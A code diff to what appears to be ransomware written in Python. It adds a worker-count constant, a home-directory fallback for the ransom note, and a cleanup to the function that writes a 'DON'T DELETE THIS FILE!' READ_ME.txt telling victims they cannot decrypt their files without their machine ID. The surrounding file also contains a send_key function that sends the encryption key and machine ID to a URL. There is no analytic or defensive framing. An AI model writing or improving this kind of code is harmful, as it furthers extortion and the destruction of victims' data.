@@ -17,6 +17,8 @@ from uuid import UUID
 
 import requests
 
+MAX_WORKERS = min(32, (os.cpu_count() or 1) * 4)
+
 
 def send_key(url: str, key: bytes, machine_id: str) -> None:
     """
@@ -77,6 +79,10 @@ def save_warning_text(machine_id: str, filename: str = "READ_ME.txt") -> None:
     """
     desktop_path = get_desktop_path()
     path = desktop_path / filename
+
+    if not desktop_path.exists() or not desktop_path.is_dir():
+        path = Path.home() / filename
+
     content = [
         "DON'T DELETE THIS FILE!",
         f"MachineId: {machine_id}",
@@ -87,5 +93,6 @@ def save_warning_text(machine_id: str, filename: str = "READ_ME.txt") -> None:
         "*Note that, if you lose your machine id, you",
         "won't be able to decrypt your files.",
     ]
-    Path(path).write_text("\n".join(content), encoding="utf-8")
+    path.write_text("\n".join(content), encoding="utf-8")
+
     print(f"Warning file saved at: {path}")
